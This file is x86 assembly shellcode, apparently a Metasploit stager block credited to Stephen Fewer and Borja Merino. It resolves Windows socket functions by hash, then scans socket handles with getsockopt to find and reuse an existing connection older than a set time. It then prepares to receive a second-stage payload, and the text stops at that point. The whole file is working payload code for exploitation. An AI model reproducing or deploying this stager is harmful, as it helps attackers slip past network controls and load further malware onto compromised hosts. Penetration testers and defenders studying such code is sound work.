[BITS 32]

; Input: EBP must be the address of 'api_call'.
; Output: EDI will be the socket for the connection to the server
; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)

; Stephen Fewer code to call WSAData
reverse_tcp:
  push 0x00003233        ; Push the bytes 'ws2_32',0,0 onto the stack.
  push 0x5F327377        ; ...
  push esp               ; Push a pointer to the "ws2_32" string on the stack.
  push 0x0726774C        ; hash( "kernel32.dll", "LoadLibraryA" )
  call ebp               ; LoadLibraryA( "ws2_32" )
  
  mov eax, 0x0190        ; EAX = sizeof( struct WSAData )
  sub esp, eax           ; alloc some space for the WSAData structure
  push esp               ; push a pointer to this stuct
  push eax               ; push the wVersionRequested parameter
  push 0x006B8029        ; hash( "ws2_32.dll", "WSAStartup" )
  call ebp               ; WSAStartup( 0x0190, &WSAData );

; Borja Merino modification over the "block_reverse_tcp.asm" Metasploit stager.
; In this case instead of creating a new connection the socket is located 
; (based on its lifetime) and reused.

  xor edi, edi 		 ; socket handle counter
loop_handle:
  add edi, 0x04		 ; next socket
  mov edx, esp		 ; 
  lea eax, [edx-0x4]     ; optlen, output parameter
  push eax               ; 
  push edx               ; seconds associated with the socket, output parameter
  push 0x700C            ; SO_CONNECT_TIME
  push 0xFFFF            ; SOL_SOCKET
  push edi               ; socket handle
  push 0x2977A2EE        ; hash( "Ws2_32.dll", "getsockopt" )
  call ebp               ; getsockopt(socket, SOL_SOCKET, SO_CONNECT_TIME, &optval, &optlen)
  test eax, eax          ; if not a valid socket loop again
  jnz loop_handle
  pop edx		 ; get the seconds from the stack
  cmp edx, 0xA           ; compare the number of seconds with the embedded value (change me)
  jl loop_handle	 ; if it is lower loop again
 			 ; we found the socket
  mov esi, esp           ; the 4 byte buffer on the stack to hold the second stage length  
